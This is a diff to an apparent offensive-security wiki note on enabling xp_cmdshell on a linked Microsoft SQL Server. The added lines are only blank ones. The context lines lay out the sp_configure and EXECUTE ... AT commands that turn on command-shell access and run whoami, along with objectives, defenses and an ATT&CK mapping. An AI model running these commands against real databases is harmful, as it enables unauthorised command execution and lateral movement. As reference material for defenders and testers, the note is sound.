@@ -34,9 +34,13 @@ To enable xp_cmdshell, the attacker must have elevated privileges on the linked 
 
 This technique can be used to maintain persistence on a compromised system, exfiltrate data, or move laterally through a network.
 
+ 
+
 ## Requirements
 
 1. Elevated privileges on the linked database
+
+ 
 
 ## Defense
 
@@ -45,6 +49,8 @@ This technique can be used to maintain persistence on a compromised system, exfi
 1. Restrict privileges on the linked database to limit access to only authorized users
 
 1. Monitor for unusual command shell activity on the host operating system
+
+ 
 
 ## Objectives
 
@@ -55,6 +61,8 @@ This technique can be used to maintain persistence on a compromised system, exfi
 1. Exfiltrate data
 
 1. Move laterally through a network
+
+ 
 
 # Instructions
 
@@ -71,9 +79,17 @@ RECONFIGURE;
 
 EXEC xp_cmdshell 'whoami';
 
+ 
+
+
+
 **Code**: [[SQL> EXECUTE('EXEC sp_configure ''show advanced op]]
 
+
+
 > The above commands are used to enable xp_cmdshell and execute whoami command on a linked database. The first command 'EXEC sp_configure 'show advanced options',1' is used to enable advanced options in SQL Server. The second command 'RECONFIGURE' is used to apply the changes made in the previous command. The third command 'EXEC sp_configure 'xp_cmdshell',1' is used to enable xp_cmdshell. The fourth command 'RECONFIGURE' is used to apply the changes made in the previous command. Finally, the fifth command 'exec xp_cmdshell whoami' is used to execute the whoami command on the linked database.
+
+
 
 **Command** ([[Enable advanced options and xp_cmdshell]]):
 
@@ -84,6 +100,8 @@ SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
 SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
 SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -104,3 +122,5 @@ SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
 - [[Execute Procedure on Linked Database]]
 - [[Linked Database]]
 - [[MSSQL Server]]
+
+
